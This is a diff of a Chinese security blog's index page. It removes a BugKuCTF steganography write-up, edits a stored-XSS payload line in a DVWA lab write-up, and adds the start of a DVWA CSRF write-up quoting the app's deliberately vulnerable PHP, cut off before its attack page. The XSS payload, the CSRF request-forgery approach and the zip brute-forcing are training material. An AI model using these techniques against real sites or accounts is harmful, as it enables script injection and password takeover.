@@ -233,217 +233,6 @@
 
 
   
-    <article id="post-BugKuCTF—杂项题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/">BugKuCTF — 杂项题(第1-10关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/" class="archive-article-date">
-  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="第一关（签到题）"><a href="#第一关（签到题）" class="headerlink" title="第一关（签到题）"></a>第一关（签到题）</h3><p>关注公众号扫描二维码就能获得flag</p>
-<hr>
-<h3 id="第二关（这是一张单纯的图片）"><a href="#第二关（这是一张单纯的图片）" class="headerlink" title="第二关（这是一张单纯的图片）"></a>第二关（这是一张单纯的图片）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/misc/1.jpg</span><br></pre></td></tr></table></figure>
-<p>打开链接发现是一张<strong>jpg</strong>图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/1-1.png" alt="1-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/1-2.png" alt="1-2"></p>
-<p>看了一下图片属性，没发现什么东西</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/1-3.png" alt="1-3"></p>
-<p>使用UE（UltraEdit）打开图片看看。发现在最后几行有着<strong>Unicode</strong>编码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/1-4.png" alt="1-4"></p>
-<p>复制这个Unicode编码，通过在线工具转换成<strong>ASCII</strong>编码后，Flag就出来了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/1-5.png" alt="1-5"></p>
-<hr>
-<h3 id="第三关（隐写）"><a href="#第三关（隐写）" class="headerlink" title="第三关（隐写）"></a>第三关（隐写）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar</span><br></pre></td></tr></table></figure>
-<p>下载下来是一个<strong>rar</strong>文件，里面有一张<strong>png</strong>图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-1.png" alt="2-1"></p>
-<p>首先，还是先看一下图片的属性，没发现什么东西</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-2.png" alt="2-2"></p>
-<p>使用UE打开，旁边也没有发现可疑的编码。怀疑图片的高度或宽度被更改了，看一下果然如此</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt="2-3"></p>
-<p>这里说一下关于使用UE打开图片后，十六进制内容的含义：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PNG图片固定格式：</span><br><span class="line">89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，</span><br><span class="line"></span><br><span class="line">（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line"></span><br><span class="line">（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到</span><br></pre></td></tr></table></figure>
-<p>修改一下图片的高度，改成和宽度一样，就可以看到flag了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-4.png" alt="2-4"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-5.png" alt="2-5"></p>
-<hr>
-<h3 id="第四关（telnet）"><a href="#第四关（telnet）" class="headerlink" title="第四关（telnet）"></a>第四关（telnet）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/misc/telnet/1.zip</span><br></pre></td></tr></table></figure>
-<p>下载下来一个<strong>.pcap</strong>类型的文件，是抓包的数据，可以用<strong>wireshark</strong>打开</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/4-1.png" alt="4-1"></p>
-<p>打开后，只看到一个TCP流，我们直接追踪，就可以看到flag了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/4-2.png" alt="4-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/4-3.png" alt="4-3"></p>
-<p>不过这题直接用UE打开，也可以看到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/4-4.png" alt="4-4"></p>
-<hr>
-<h3 id="第五关（眼见非实ISCCCTF）"><a href="#第五关（眼见非实ISCCCTF）" class="headerlink" title="第五关（眼见非实ISCCCTF）"></a>第五关（眼见非实ISCCCTF）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip</span><br></pre></td></tr></table></figure>
-<p>下载下来的是一个名字叫<strong>zip</strong>的文件，什么后缀都没有，我们先用UE打开</p>
-<p>看到前四个字节是这样的，那么这是一个<strong>ZIP压缩文件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZIP压缩文件固定格式：</span><br><span class="line">50 4B 03 04</span><br></pre></td></tr></table></figure>
-<p>既然是ZIP压缩文件，就给它加上<strong>.zip</strong>后缀，然后解压下来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/5-1.png" alt="5-1"></p>
-<p>解压下来发现是一个<strong>.docx</strong>文件，再次用UE打开，发现前缀还是<strong>50 4B 03 04</strong>，这还是一个<strong>ZIP压缩文件</strong></p>
-<p>老样子，把后缀改正<strong>.zip</strong>，解压下来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/5-2.png" alt="5-2"></p>
-<p>这次解压下来一个文件夹，用记事本打开里面  “word-document.xml”  文件，搜索flag就找到了答案</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/5-3.png" alt="5-3"></p>
-<hr>
-<h3 id="第六关（啊哒）"><a href="#第六关（啊哒）" class="headerlink" title="第六关（啊哒）"></a>第六关（啊哒）</h3><h4 id="这道题我自己开始接触KALI的binwalk、dd、foremost工具"><a href="#这道题我自己开始接触KALI的binwalk、dd、foremost工具" class="headerlink" title="这道题我自己开始接触KALI的binwalk、dd、foremost工具"></a>这道题我自己开始接触KALI的<strong>binwalk、dd、foremost</strong>工具</h4><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
-<p>下载下来是一个zip压缩文件，解压出一张jpg图片</p>
-<p>第一步还是先看一下属性。注意到属性中有一串突然出现的十六进制数字，不知道干嘛用的，先放着</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-1.png" alt="6-1"></p>
-<p>先用UE打开。搜索看到关于flag的线索：flag.txt</p>
-<p><strong>注意：利用UE搜索时，记得勾选”查找ASCII”选项</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-2.png" alt="6-2"></p>
-<p>既然有隐藏文件，放到KALI里面用<strong>dd</strong>或<strong>foremost</strong>进行分离</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<p>在分离出来的文件夹里，发现一个zip压缩文件，里面有flag.txt，尝试解压却要密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-4.png" alt="6-4"></p>
-<p>这是我们想到之前在属性看到的那串十六进制数字。将其转换成字符串</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-5.png" alt="6-5"></p>
-<p>将转换后的字符串输入，果然是密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-6.png" alt="6-6"></p>
-<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>套路，先用binwalk看一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
-<p>利用<strong>dd</strong>或者<strong>foremost</strong>提取出其中的隐藏文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<p>剩下的步骤和方法一中的一样了</p>
-<hr>
-<h3 id="第七关（又是一张图片，还单纯吗）"><a href="#第七关（又是一张图片，还单纯吗）" class="headerlink" title="第七关（又是一张图片，还单纯吗）"></a>第七关（又是一张图片，还单纯吗）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/misc/2.jpg</span><br></pre></td></tr></table></figure>
-<p>链接打开是一张图片，这次这道题目直接在KALI上把它下载下来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://123.206.87.240:8002/misc/2.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/7-1.png" alt="7-1"></p>
-<p>老套路，还是用Binwalk看一下里面有没有藏东西。果然有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/7-2.png" alt="7-2"></p>
-<p>用foremost进行分离，分离出来的东西放在output文件夹内</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 2.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/7-3.png" alt="7-3"></p>
-<p>打开output文件夹内的JPG文件夹，里面静静躺着2张图片，直接尝试了一下第2张图片里的flag，就成功了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/7-4.png" alt="7-4"></p>
-<hr>
-<h3 id="第八关（猜）"><a href="#第八关（猜）" class="headerlink" title="第八关（猜）"></a>第八关（猜）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/misc/cai/QQ20170221-132626.png</span><br></pre></td></tr></table></figure>
-<p>下载下来一张图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/8-1.png" alt="8-1"></p>
-<p>老规矩还是用Binwalk看一下。可是没有发现有用信息，根据这道题目名字”猜”，所以应该不是考察隐写</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/8-2.png" alt="8-2"></p>
-<p>后来发现百度有个功能叫做<strong>“百度识图”</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/8-3.png" alt="8-3"></p>
-<p>识别一下这张图片，结果提示的是<strong>“刘亦菲”</strong>。那么根据题目说的，flag是某人的名字全拼</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/8-4.png" alt="8-4"></p>
-<p>试了一下<strong>key{liuyifei}</strong>，结果竟然真的是。这道题告诉我们，要善于利（给）用（百）搜（度）索（打）工（广）具（告）</p>
-<hr>
-<h3 id="第九关（宽带信息泄露）"><a href="#第九关（宽带信息泄露）" class="headerlink" title="第九关（宽带信息泄露）"></a>第九关（宽带信息泄露）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin</span><br></pre></td></tr></table></figure>
-<p>下载下来一个后缀名是<strong>.bin</strong>的文件，一般这种文件是二进制文件，先用记事本和UE打开都没有任何的发现，是一堆乱码</p>
-<p>后来发现一个叫做<strong>RouterPassView</strong>的软件，可以用来查看bin文件。下载下来试了一下，果然可以打开并且正常显示</p>
-<p>因为题目提示：flag{宽带用户名}，所以直接ctrl+f搜索”username”，直接找到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/9-1.png" alt="9-1"></p>
-<hr>
-<h3 id="第十关（隐写2）"><a href="#第十关（隐写2）" class="headerlink" title="第十关（隐写2）"></a>第十关（隐写2）</h3><p>题目链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg</span><br></pre></td></tr></table></figure>
-<p>下载下来一张jpg格式图片，在Windows下查看属性没发现什么东西</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-1.png" alt="10-1"></p>
-<p>UE打开后，发现里面藏着flag.rar（题目写着隐写，其实可以直接binwalk，如果没有骗人的话）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-2.png" alt="10-2"></p>
-<p>赶紧放到Kali里面去用binwalk看一下，果然有藏东西</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-3.png" alt="10-3"></p>
-<p>赶紧用foremost分离，分离出来一个zip文件夹，里面有一个zip文件，解压出2个文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-4.png" alt="10-4"></p>
-<p>先看一下<strong>提示.jpg</strong>，只知道是<strong>QJK</strong>，其他什么都没看出来（黑人问号？？？）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-5.png" alt="10-5"></p>
-<p>先提取<strong>flag.rar</strong>看看猜密码，发现这不是rar文件，而是zip文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-6.png" alt="10-6"></p>
-<p>修改后缀名为.zip，然后直接使用<strong>fcrackzip</strong>工具暴力破解出密码是<strong>871</strong></p>
-<p>-b：代表brute-force，暴力破解；-l：表示密码长度（3-3就是3了）；-c：指定字符集合（看下面第2张图片）</p>
-<p>可以看一下这篇简单的文章：<a href="http://topspeedsnail.com/fcrackzip-crack-zip-password/" target="_blank" rel="noopener">fcrackzip简单讲解</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-7.png" alt="10-7"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-7-2.png" alt="10-7-2"></p>
-<p>后来自己想想这个<strong>871</strong>是怎么来的？看下图吧，脑洞大开</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-8.png" alt="10-8"></p>
-<p>输入密码后解压出来一张图片3.jpg</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-9.png" alt="10-9"></p>
-<p>在Windows环境下查看属性没有收获</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-10.png" alt="10-10"></p>
-<p>用UE打开。刚开始搜索flag关键字，没有找到，但是还好谨慎用眼睛找了一下，发现了f1@g字样，难怪没有找到，社会凶险，城市套路多，学到了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-11.png" alt="10-11"></p>
-<p>复制了去提交发现不对，然后看到括号里面是base64的编码，想把它解码一下再放进去提交，结果就可以了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/10-12.png" alt="10-12"></p>
-<hr>
-<h3 id="至此，1-10关的Write-up结束"><a href="#至此，1-10关的Write-up结束" class="headerlink" title="至此，1-10关的Write-up结束"></a>至此，1-10关的Write-up结束</h3><h3 id="后一部分链接：第11-20关Write-up"><a href="#后一部分链接：第11-20关Write-up" class="headerlink" title="后一部分链接：第11-20关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/04/BugKuCTF%E2%80%94%E6%9D%82%E9%A1%B9%E9%A2%98%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -603,7 +392,7 @@
 <p>后端中对<code>Message</code>参数仅仅通过<code>stripslashes()</code>进行处理，然而该函数的作用是去除反斜杠，可用于清理从数据库或HTML表单中取回的数据，而我们没有用到反斜杠</p>
 <p>前端将<code>Name</code>字段限长为10个字符串，所以我们选择从<code>Message</code>处进行攻击</p>
 <p>Name随意，Message为</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(/xss/)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/11-2.png" alt="11-2"></p>
 <p>可以看一下数据库里插入了什么</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/11-3.png" alt="11-3"></p>
@@ -1598,9 +1387,123 @@
 
 
   
+    <article id="post-DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/">DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/" class="archive-article-date">
+  	<time datetime="2019-02-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\csrf\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>更改当前用户的密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-1.png" alt="3-1"></p>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从源码可以看出来，对<code>原密码($pass_conf)</code>和<code>新密码($pass_new)</code>没有任何的过滤，只是简单地判断一下是否相等，如果相等，就更改当前用户的密码</p>
+<p>我们先提交一次，来看一下结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-2.png" alt="3-2"></p>
+<p>从抓取到的结果来看，修改密码的请求是通过<code>GET</code>方式发出的，那就意味着只要构造一个URL，并且让受害者点击访问，就可以更改受害者的账号密码，但是这种方式很明显，懂一些安全知识的人一眼就看出来了，甚至懂英语的就能看出来，所以是不可行的</p>
+<p>那我们就还可以用一些比较隐蔽的方法，比如写一个<code>HTML页面</code>，代码如下</p>
